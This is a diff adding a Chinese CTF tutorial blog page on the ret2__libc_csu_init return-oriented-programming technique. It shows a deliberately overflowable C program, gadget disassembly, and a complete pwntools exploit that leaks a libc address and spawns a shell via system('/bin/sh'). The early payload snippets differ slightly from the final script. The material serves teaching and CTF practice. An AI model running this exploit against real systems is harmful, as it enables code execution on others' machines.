@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2__libc_csu_init攻击技术示例-使用通用gadget</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2__libc_csu_init攻击技术示例-使用通用gadget</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-04">2017-08-04</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文参照蒸米的《一步一步学ROP之linux_x64篇》中的通用gadgets节</p>
+</blockquote>
+
+<p>大部分程序在编译时都会加入一些通用函数进行初始化，而虽然程序源码不同，但初始化过程基本相同，利用这点，我们就可以使用其中的通用gadget劫持控制流</p>
+
+<h2 id="ret2__libc_csu_init示例代码">ret2__libc_csu_init示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#undef _FORTIFY_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
+	<span class="n">vulnerable_function</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序可以在此处下载： <a href="http://od7mpc53s.bkt.clouddn.com/ret2__libc_csu_init">ret2__libc_csu_init</a></p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>程序中没有<code class="highlighter-rouge">system()</code>也没有字符串<code class="highlighter-rouge">/bin/sh</code>，那么我们就需要尝试通过泄露libc地址，从而计算处<code class="highlighter-rouge">system()</code>地址，再将字符串<code class="highlighter-rouge">"/bin/sh"</code>写入<code class="highlighter-rouge">.bss</code>段中，最后模拟调用<code class="highlighter-rouge">system("/bin/sh")</code></p>
+
+<p>程序中有<code class="highlighter-rouge">write()</code>函数，因此可以通过该函数输出<code class="highlighter-rouge">write.got</code>的地址，既然有能泄露内存信息的函数了，那么现在的问题就在于如何传递参数给<code class="highlighter-rouge">write()</code></p>
+
+<p>本次程序使用的是x64文件，x64下前6个参数会依次由<code class="highlighter-rouge">rdi rsi rdx rcx r8 r9</code>传递，而超过6个参数时，则会和x86一样，多余的参数从右至左压入栈中</p>
+
+<p>当使用<code class="highlighter-rouge">ROPgadget</code>没有搜索到符合条件的gadgets时，我们就可以考虑使用<code class="highlighter-rouge">__libc_csu_init()</code>中的通用gadgets</p>
+
+<pre><code class="language-asm">00000000004005c0 &lt;__libc_csu_init&gt;:
+  4005c0:	41 57                	push   %r15
+  4005c2:	41 56                	push   %r14
+  4005c4:	41 89 ff             	mov    %edi,%r15d
+  4005c7:	41 55                	push   %r13
+  4005c9:	41 54                	push   %r12
+  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;
+  4005d2:	55                   	push   %rbp
+  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;
+  4005da:	53                   	push   %rbx
+  4005db:	49 89 f6             	mov    %rsi,%r14
+  4005de:	49 89 d5             	mov    %rdx,%r13
+  4005e1:	4c 29 e5             	sub    %r12,%rbp
+  4005e4:	48 83 ec 08          	sub    $0x8,%rsp
+  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp
+  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;
+  4005f1:	48 85 ed             	test   %rbp,%rbp
+  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;
+  4005f6:	31 db                	xor    %ebx,%ebx
+  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  4005ff:	00
+  400600:	4c 89 ea             	mov    %r13,%rdx
+  400603:	4c 89 f6             	mov    %r14,%rsi
+  400606:	44 89 ff             	mov    %r15d,%edi
+  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+  40060d:	48 83 c3 01          	add    $0x1,%rbx
+  400611:	48 39 eb             	cmp    %rbp,%rbx
+  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;
+  400616:	48 83 c4 08          	add    $0x8,%rsp
+  40061a:	5b                   	pop    %rbx
+  40061b:	5d                   	pop    %rbp
+  40061c:	41 5c                	pop    %r12
+  40061e:	41 5d                	pop    %r13
+  400620:	41 5e                	pop    %r14
+  400622:	41 5f                	pop    %r15
+  400624:	c3                   	retq
+  400625:	90                   	nop
+  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+  40062d:	00 00 00
+</code></pre>
+
+<p>我们来关注一下<code class="highlighter-rouge">0x40061a</code>处的汇编代码</p>
+
+<pre><code class="language-asm">40061a:	5b                   	pop    %rbx
+40061b:	5d                   	pop    %rbp
+40061c:	41 5c                	pop    %r12
+40061e:	41 5d                	pop    %r13
+400620:	41 5e                	pop    %r14
+400622:	41 5f                	pop    %r15
+400624:	c3                   	retq
+</code></pre>
+
+<p>我们可以通过这片代码控制<code class="highlighter-rouge">rbx rbp r12 r13 r14 r15</code>寄存器的值，</p>
+
+<pre><code class="language-asm">400600:	4c 89 ea             	mov    %r13,%rdx
+400603:	4c 89 f6             	mov    %r14,%rsi
+400606:	44 89 ff             	mov    %r15d,%edi
+400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+40060d:	48 83 c3 01          	add    $0x1,%rbx
+400611:	48 39 eb             	cmp    %rbp,%rbx
+</code></pre>
+<p>随后借由<code class="highlighter-rouge">0x400600</code>我们通过<code class="highlighter-rouge">r13 r14 r15</code>间接控制了<code class="highlighter-rouge">rdx rsi edi</code>的值。随后是<code class="highlighter-rouge">callq  *(%r12,%rbx,8)</code>也就是<code class="highlighter-rouge">call qword ptr [r12+rbx*8]</code>，我们设置<code class="highlighter-rouge">rbx=0</code>，再构造<code class="highlighter-rouge">r12</code>的值，那么就可以调用任意地址的函数。执行完<code class="highlighter-rouge">call qword ptr [r12+rbx*8]</code>后，<code class="highlighter-rouge">rbx+=1</code>并将<code class="highlighter-rouge">rbx</code>与<code class="highlighter-rouge">rbp</code>进行比较，这里我们设置<code class="highlighter-rouge">rbp</code>的值为1，那么在比较的时候恒成立，那么程序接下来继续执行，就可以成功retrun到我们想要的地址</p>
+
+<p>首先我们先来构造payload1，利用<code class="highlighter-rouge">write()</code>函数输出write在内存的地址</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2__libc_csu_init'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>
+
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">got_read</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>
+
+<span class="n">csu_init_front</span> <span class="o">=</span> <span class="mh">0x400600</span>
+<span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x40061a</span>
+
+<span class="c">#write(rdi=1, rsi=write.got, rdx=4)</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=write.got</span>
+<span class="c">#r13=rdx=8</span>
+<span class="c">#r14=rsi=write.got</span>
+<span class="c">#r15=edi=1</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>这样我们就已经使用__libc_csu_init中的通用gadgets泄露出了write函数的内存地址了</p>
+
+<p>接下来我们需要解决的，就是构造payload2，利用<code class="highlighter-rouge">read()</code>函数将<code class="highlighter-rouge">system()</code>的地址以及<code class="highlighter-rouge">/bin/sh</code>写入到<code class="highlighter-rouge">.bss</code>段中</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#read(rdi=0, rsi=bss_addr, rdx=16)</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=read.got</span>
+<span class="c">#r13=rdx=16</span>
+<span class="c">#r14=rsi=bss_addr</span>
+<span class="c">#r15=edi=0</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_read</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>那么最后，就是构造payload3，执行<code class="highlighter-rouge">system(rdi=bss_addr+8="/bin/sh")</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#system(rdi=bss_addr+8="/bin/sh")</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=bss_addr</span>
+<span class="c">#r13=rdx=0</span>
+<span class="c">#r14=rsi=0</span>
+<span class="c">#r15=edi=bss_addr+8</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>OK，我们的所有payload在此就都已经构造完毕了。</p>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2__libc_csu_init'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">got_read</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_start'</span><span class="p">]</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>
+
+<span class="n">libc_write</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">csu_init_front</span> <span class="o">=</span> <span class="mh">0x0000000000400600</span>
+<span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x000000000040061A</span>
+
+<span class="c">#write(rdi=1, rsi=write.got, rdx=4)</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=write.got</span>
+<span class="c">#r13=rdx=8</span>
+<span class="c">#r14=rsi=write.got</span>
+<span class="c">#r15=edi=1</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+
+
+<span class="c">#read(rdi=0, rsi=bss_addr, rdx=16)</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=read.got</span>
+<span class="c">#r13=rdx=16</span>
+<span class="c">#r14=rsi=bss_addr</span>
+<span class="c">#r15=edi=0</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_read</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+
+
+
+<span class="c">#system(rdi=bss_addr+8="/bin/sh")</span>
+<span class="c">#rbx=0</span>
+<span class="c">#rbp=1</span>
+<span class="c">#r12=bss_addr</span>
+<span class="c">#r13=rdx=0</span>
+<span class="c">#r14=rsi=0</span>
+<span class="c">#r15=edi=bss_addr+8</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_init_front</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ret2__libc_csu_init'</span><span class="p">)</span>
+
+<span class="c"># payload 1</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Hello, World</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c"># calculate some address</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">"[+] write() address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc_write</span>
+<span class="k">print</span> <span class="s">"[+] libc base address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_system</span>
+<span class="k">print</span> <span class="s">"[+] system() address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="c"># payload 2</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Hello, World</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c"># payload 3</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Hello, World</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/04/how2heap-01-first-fit/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/04/stack-privot-%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/04/how2heap-01-first-fit/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/04/stack-privot-%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
